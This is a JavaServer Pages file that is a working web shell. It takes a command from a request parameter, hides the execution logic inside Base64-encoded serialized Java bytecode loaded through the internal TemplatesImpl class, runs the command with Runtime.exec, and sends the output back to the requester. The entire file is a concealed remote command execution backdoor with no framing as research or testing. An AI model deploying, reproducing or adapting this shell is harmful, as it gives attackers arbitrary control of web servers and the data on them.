<%@ page import="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" %>
<%@ page import="java.io.ByteArrayInputStream" %>
<%@ page import="java.io.ObjectInputStream" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.File" %>
<%
    String tmp = System.getProperty("java.io.tmpdir");
    Files.write(Paths.get(tmp + File.separator + "cmd"), request.getParameter("threedr3am").getBytes());
    TemplatesImpl t = (TemplatesImpl) ((Map) new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABcHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAC/DK/rq+AAAANACYCgAjAE0IAE4IAE8KAFAAUQcAUgoAUwBUCgBVAFYKAAUAVwgAWAgAWQoABQBaCABbCgAFAFwKAFAAXQoAXgBfBwBgCgAQAE0HAGEHAGIKABMAYwoAEgBkCgASAGUKABAAZggAZwcAaAoAVQBpCgBVAGoKABAAawoABQBsBwBtCgBVAG4HAG8KACAAcAcAcQcAcgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAlpbnB1dEZpbGUBABJMamF2YS9sYW5nL1N0cmluZzsBAApvdXRwdXRGaWxlAQALaW5wdXRTdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAA1zdHJpbmdCdWlsZGVyAQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADmJ1ZmZlcmVkUmVhZGVyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAEbGluZQEAAWUBABVMamF2YS9sYW5nL1Rocm93YWJsZTsBAAR0aGlzAQATTFRocmVlZHIzYW1TY3JpcHQyOwEADVN0YWNrTWFwVGFibGUHAHEHAFIHAHMHAGAHAGEHAG8BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAdAEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAFlRocmVlZHIzYW1TY3JpcHQyLmphdmEMACQAJQEACC90bXAvY21kAQALL3RtcC9yZXN1bHQHAHUMAHYAdwEAEGphdmEvbGFuZy9TdHJpbmcHAHgMAHkAegcAewwAfAB9DAAkAH4BAAElAQAADAB/AIABAAEgDACBAIIMAIMAhAcAhQwAhgCHAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAJACIDAAkAIkMAIoAiwwAjACNAQABCgEAGGphdmEvbmlvL2ZpbGUvTGlua09wdGlvbgwAjgCPDACQAJEMAJIAiwwAkwCUAQAYamF2YS9uaW8vZmlsZS9PcGVuT3B0aW9uDACVAJYBABNqYXZhL2xhbmcvVGhyb3dhYmxlDACXACUBABFUaHJlZWRyM2FtU2NyaXB0MgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lucHV0U3RyZWFtAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQATamF2YS9uaW8vZmlsZS9QYXRocwEAA2dldAEAOyhMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL25pby9maWxlL1BhdGg7AQATamF2YS9uaW8vZmlsZS9GaWxlcwEADHJlYWRBbGxCeXRlcwEAGChMamF2YS9uaW8vZmlsZS9QYXRoOylbQgEABShbQilWAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAGZXhpc3RzAQAyKExqYXZhL25pby9maWxlL1BhdGg7W0xqYXZhL25pby9maWxlL0xpbmtPcHRpb247KVoBAAZkZWxldGUBABcoTGphdmEvbmlvL2ZpbGUvUGF0aDspVgEACHRvU3RyaW5nAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAFd3JpdGUBAEcoTGphdmEvbmlvL2ZpbGUvUGF0aDtbQltMamF2YS9uaW8vZmlsZS9PcGVuT3B0aW9uOylMamF2YS9uaW8vZmlsZS9QYXRoOwEAD3ByaW50U3RhY2tUcmFjZQAhACIAIwAAAAAAAwABACQAJQABACYAAAGLAAUABwAAAKUqtwABEgJMEgNNuAAEuwAFWSsDvQAFuAAGuAAHtwAIEgkSCrYACxIMtgANtgAOtgAPTrsAEFm3ABE6BLsAElm7ABNZLbcAFLcAFToFGQW2ABZZOgbGABMZBBkGtgAXEhi2ABdXp//oLAO9AAW4AAYDvQAZuAAamQAOLAO9AAW4AAa4ABssA70ABbgABhkEtgActgAdA70AHrgAH1enAAhMK7YAIbEAAQAEAJwAnwAgAAMAJwAAAD4ADwAAABEABAATAAcAFAAKABUAMgAWADsAFwBMABkAVwAaAGcAHAB5AB0AhAAeAJwAIQCfAB8AoAAgAKQAIgAoAAAAUgAIAAcAlQApACoAAQAKAJIAKwAqAAIAMgBqACwALQADADsAYQAuAC8ABABMAFAAMAAxAAUAVABIADIAKgAGAKAABAAzADQAAQAAAKUANQA2AAAANwAAADAABf8ATAAGBwA4BwA5BwA5BwA6BwA7BwA8AAD8ABoHADkc/wAaAAEHADgAAQcAPQQAAQA+AD8AAgAmAAAAPwAAAAMAAAABsQAAAAIAJwAAAAYAAQAAACcAKAAAACAAAwAAAAEANQA2AAAAAAABAEAAQQABAAAAAQBCAEMAAgBEAAAABAABAEUAAQA+AEYAAgAmAAAASQAAAAQAAAABsQAAAAIAJwAAAAYAAQAAAC0AKAAAACoABAAAAAEANQA2AAAAAAABAEAAQQABAAAAAQBHAEgAAgAAAAEASQBKAAMARAAAAAQAAQBFAAEASwAAAAIATHB0AAp0aHJlZWRyM2FtcHcBAHh4"))).readObject()).get("p");
    try { t.getOutputProperties();} catch (Exception e) {}
    response.getOutputStream().write(Files.readAllBytes(Paths.get(tmp + File.separator + "result")));
%>
